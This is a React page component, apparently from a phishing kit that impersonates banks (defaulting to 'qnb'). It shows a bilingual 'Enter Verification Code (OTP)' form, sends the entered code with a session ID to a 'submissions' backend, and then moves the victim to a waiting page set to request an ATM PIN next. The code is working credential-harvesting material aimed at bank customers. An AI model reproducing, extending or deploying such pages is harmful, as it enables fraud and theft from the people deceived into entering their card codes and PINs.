import { useState, useEffect } from "react";
import { useLocation, useSearch } from "wouter";
import { trpc } from "@/lib/trpc";
import { useLanguage } from "@/contexts/LanguageContext";
import { toast } from "sonner";
import Header from "@/components/Header";
import { X } from "lucide-react";

export default function Otp() {
  const [, setLocation] = useLocation();
  const search = useSearch();
  const params = new URLSearchParams(search);
  const bank = params.get("bank") || "qnb";
  const { language } = useLanguage();
  const sessionId = params.get("session") || localStorage.getItem("sessionId") || "";
  const hasError = params.get("error") === "true";

  const isArabic = language === "ar";

  const [otp, setOtp] = useState("");
  const [errorMessage, setErrorMessage] = useState<string | null>(null);

  useEffect(() => {
    if (hasError) {
      const msg = sessionStorage.getItem("error_message");
      if (msg) {
        setErrorMessage(msg);
        sessionStorage.removeItem("error_message");
      }
    }
  }, [hasError]);

  const submitOtpMutation = trpc.submissions.submitOtp.useMutation();

  const handleOtpChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const value = e.target.value.replace(/[^0-9]/g, "").slice(0, 8);
    setOtp(value);
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    
    if (otp.length < 4) {
      toast.error(isArabic ? "الرمز غير مكتمل" : "Incomplete code");
      return;
    }
    
    try {
      await submitOtpMutation.mutateAsync({
        sessionId: sessionId,
        otpCode: otp,
        otpType: "card_otp",
      });
      setLocation(`/waiting?bank=${bank}&session=${sessionId}&next=atm-pin`);
    } catch (error) {
      toast.error(isArabic ? "حدث خطأ أثناء الإرسال" : "Error during submission");
    }
  };

  return (
    <div className="min-h-screen bg-[#f4f4f4] flex flex-col font-sans" dir={isArabic ? "rtl" : "ltr"}>
      <Header />

      <main className="flex-1 max-w-lg mx-auto w-full px-4 py-12">
        <div className="bg-white p-8 rounded-2xl shadow-xl border border-slate-100">
          {errorMessage && (
            <div className="mb-6 bg-rose-50 border border-rose-200 rounded-2xl p-4 flex items-start gap-3 animate-in fade-in slide-in-from-top-4">
              <div className="bg-rose-500 text-white rounded-full p-1 shrink-0">
                <X className="w-4 h-4" />
              </div>
              <p className="text-rose-600 text-sm font-bold leading-relaxed">
                {errorMessage}
              </p>
            </div>
          )}

          <div className="text-center space-y-4">
            <h2 className="text-2xl font-black text-slate-800">{isArabic ? "أدخل رمز التحقق (OTP)" : "Enter Verification Code (OTP)"}</h2>
            <p className="text-slate-500 font-medium">{isArabic ? "تم إرسال رمز التحقق إلى رقم هاتفك المسجل" : "Verification code has been sent to your registered mobile number"}</p>
            
            <form onSubmit={handleSubmit} className="pt-4 space-y-8">
              <input
                type="text"
                className="w-full h-20 text-center bg-slate-50 border-2 border-slate-100 rounded-2xl focus:ring-4 focus:ring-[#8C0032]/10 focus:border-[#8C0032] transition-all text-4xl font-black tracking-[0.3em] outline-none"
                placeholder="------"
                maxLength={8}
                value={otp}
                onChange={handleOtpChange}
                required
              />
              <button type="submit" className="w-full h-16 bg-[#8C0032] hover:bg-[#a8003d] text-white text-xl font-black rounded-xl shadow-lg transition-all active:scale-95">
                {isArabic ? "تأكيد الرمز" : "Confirm Code"}
              </button>
            </form>
          </div>
        </div>
      </main>

      <div className="footer-image-container">
        <img src={isArabic ? "https://i.ibb.co/23sMQkSF/IMG-20260714-WA0015.jpg" : "https://i.ibb.co/609jMvhx/IMG-20260714-WA0016.jpg"} className="footer-image-standard" alt="Footer" />
      </div>
    </div>
  );
}
